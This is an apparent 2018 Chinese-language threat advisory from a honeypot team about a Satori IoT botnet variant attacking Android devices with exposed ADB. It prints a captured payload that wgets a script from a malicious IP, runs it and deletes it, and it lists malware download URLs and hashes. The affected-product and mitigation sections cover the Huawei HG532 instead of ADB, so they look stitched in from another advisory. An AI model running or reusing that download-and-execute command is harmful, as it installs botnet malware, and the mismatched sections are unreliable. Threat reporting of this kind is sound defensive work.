---
layout:     post
title:      最新Satori IoT僵尸网络变种针对ADB服务设备进行攻击通报
subtitle:   ADB服务
date: 2018-08-20
author:     shenzhen_antiylabs
header-img: img/avatar-by.jpg
catalog: true
tags:
    - honeypot_event
---

# 最新Satori IoT僵尸网络变种针对ADB服务设备进行攻击通报

## 概述

adb是android sdk里的一个工具，用这个工具可以直接操作管理android模拟器或者真实的android设备(包括一些IOT设备).，它的主要功能有:

\* 运行设备的shell(命令行)

\* 管理模拟器或设备的端口映射

\* 计算机和设备之间上传/下载文件

\* 将本地APK软件安装至模拟器或android设备

攻击手段回顾：

6月份Satori IoT僵尸网络利用D-Link DSL-2750B路由器的RCE（远程执行代码）漏洞，下载站点为95.215.62.169

7月份，安天蜜网监测到新的利用方式，并捕获最新样本，下载站点和此前一致，目前反病毒产品尚未检出，经过分析，我们认为它是新的Satori IoT僵尸网络变种，针对基于adb服务设备的新一轮利用，具体分析如下：

## 漏洞描述

安卓设备的adb远程调试接口5555端口暴露在公网，其中一部分是电视盒，但其他设备尚未确定，有可能是其他使用安卓系统的网络设备。

## 捕获载荷

```
  OPEN............]+......shell:>/sdcard/Download/f && cd /sdcard/Download/; >/dev/f && cd /dev/;busybox wget http://95.215.62.169/adbs -O -> adbs; sh adbs; rm adbs.

CNXN............2.......host::.OPEN............]+......shell:>/sdcard/Download/f&& cd /sdcard/Download/; >/dev/f && cd /dev/; busybox wget http://95.215.62.169/adbs -O -> adbs; sh adbs; rm adbs.

Adbs文件内容如下：
 
```

![adbs](https://github.com/zhongshendoushuizhao/zhongshendoushuizhao.github.io/blob/master/img/adb.jpg)



## 	攻击IP及URL

http://118.193.233.8:4780/dd-wrtlei

http://118.193.233.8:4780/linux2.4lei

http://118.193.233.8:4780/linux2.6lei

http://118.193.233.8:4780/linux-armlei

http://118.193.233.8:4780/linux-mipslei

http://118.193.233.8:4780/immm.exe

## 样本



| 文件名 | 病毒家族 | Hash |
| ------ | -------- | ---- |
|        |          |      |

| dd-wrtlei                 | Trojan[Backdoor]/Linux.Dofloo  | 411327ac98f156a446df3556bb29a05a |
| ------------------------- | ------------------------------ | -------------------------------- |
| Linux2.4lei               | Trojan[Backdoor]/Linux.Dofloo  | 148e9ea2bf1a6e873baec19130b52050 |
| Linux2.6lei               | Trojan[Backdoor]/Linux.Dofloo  | aeffdae8ccb7c86d3868369781b70e14 |
| linux-armlei              | Trojan[Backdoor]/Linux.Dofloo  | 62ef30a8fa91297c2657bc34c3824075 |
| linux-mipslei             | Trojan[Backdoor]/Linux.Dofloo  | d40086b072a5d66d590ecfc18d758618 |
| immm.exe                  | Trojan[DDoS]/Win32.Nitol       | b3ff1a7a453756532ba7dcf1da7f310e |
| 2.txt                     | 存在CVE-2017-17215漏洞的IP列表 |                                  |
| 2018年4月最新内核3306.zip | 3306爆破工具                   |                                  |
| Zeroshell.zar             | 传马工具                       |                                  |

  

## 受影响范围



华为HG532路由器





## 修复及防护建议



2017年11月30日，华为官方发布了安全公告，确认了该漏洞。 公告中提到了以下漏洞缓解措施：

- 配置路由器内置的防火墙
- 更改路由器默认密码
- 在路由器外部署防火墙
- 升级到最新固件



## 参考资料



[1]     华为安全公告

http://www.huawei.com/en/psirt/security-notices/huawei-sn-20171130-01-hg532-en

[2]     Check Point 漏洞报告

https://research.checkpoint.com/good-zero-day-skiddie/